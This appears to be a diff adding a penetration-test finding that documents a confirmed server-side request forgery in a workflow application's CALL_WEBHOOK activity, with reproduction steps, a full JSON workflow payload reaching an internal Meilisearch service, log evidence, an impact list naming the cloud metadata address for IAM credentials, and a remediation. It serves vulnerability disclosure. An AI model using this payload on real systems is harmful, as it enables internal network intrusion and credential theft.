@@ -1,0 +1,78 @@
+================================================================
+ F01: SSRF via CALL_WEBHOOK — CONFIRMED EXPLOITED
+ Target: http://10.0.64.14:3000
+ Date: 2026-03-25
+================================================================
+
+FINDING:
+  The CALL_WEBHOOK workflow activity makes unvalidated fetch() calls to any URL.
+  An admin user created a workflow definition with CALL_WEBHOOK targeting the 
+  Meilisearch container at 172.18.0.2:7700 (internal Docker network).
+
+STEPS TO REPRODUCE:
+  1. Authenticate as admin
+  2. POST /api/workflows/definitions with CALL_WEBHOOK activity targeting internal URL
+  3. POST /api/workflows/instances to execute the workflow
+  4. Inspect workflow instance context — internal service response is visible
+
+PAYLOAD (workflow definition):
+  {
+    "workflowId": "ssrf-poc",
+    "workflowName": "SSRF PoC",
+    "version": 1,
+    "definition": {
+      "steps": [
+        {"stepId":"start","stepName":"Start","stepType":"START"},
+        {"stepId":"end","stepName":"End","stepType":"END"}
+      ],
+      "transitions": [{
+        "transitionId": "t1",
+        "fromStepId": "start",
+        "toStepId": "end",
+        "trigger": "auto",
+        "activities": [{
+          "activityId": "ssrf-a1",
+          "activityName": "SSRF Meilisearch",
+          "activityType": "CALL_WEBHOOK",
+          "config": {"url": "http://172.18.0.2:7700/health", "method": "GET"}
+        }]
+      }]
+    }
+  }
+
+EVIDENCE — Workflow instance context after execution:
+  Instance ID: 2487bbd8-2463-41a3-838d-f5353b4e50b9
+  Status: COMPLETED
+  Context: {"SSRF Meilisearch": {"result": {"status": "available"}, "status": 200, "statusText": "OK"}}
+  
+  The internal Meilisearch service response {"status":"available"} was captured
+  and stored in the workflow context, proving the SSRF request succeeded.
+
+MEILISEARCH LOG EVIDENCE (from docker logs mercato-meilisearch-local):
+  2026-03-25T15:38:33.883058Z INFO HTTP request
+    method=GET 
+    host="172.18.0.2:7700"      ← internal Docker network IP
+    route=/health
+    user_agent=node              ← Node.js fetch() from app container
+    status_code=200
+
+IMPACT:
+  - Confirmed: App container (172.18.0.5) reached Meilisearch (172.18.0.2) 
+    via workflow CALL_WEBHOOK with no URL validation
+  - With the Meilisearch master key, all search indexes can be dumped
+  - On cloud deployments (AWS): 169.254.169.254 returns IAM credentials
+  - All services on the Docker network are reachable: Postgres (5432), 
+    Redis (6379), Meilisearch (7700)
+
+AUTH REQUIRED:
+  - Admin role (workflows.definitions.create + workflows.instances.create)
+  - In multi-tenant SaaS: tenant admin = untrusted third party
+
+AFFECTED FILE:
+  packages/core/src/modules/workflows/lib/activity-executor.ts:611
+  const response = await fetch(url, { method, headers, body })  ← no validation
+
+REMEDIATION:
+  Add validateWebhookUrl() before fetch() — see SPEC-061 H2
+  CALL_API in same file already has SSRF prevention (buildApiUrl(), line 821)
+================================================================
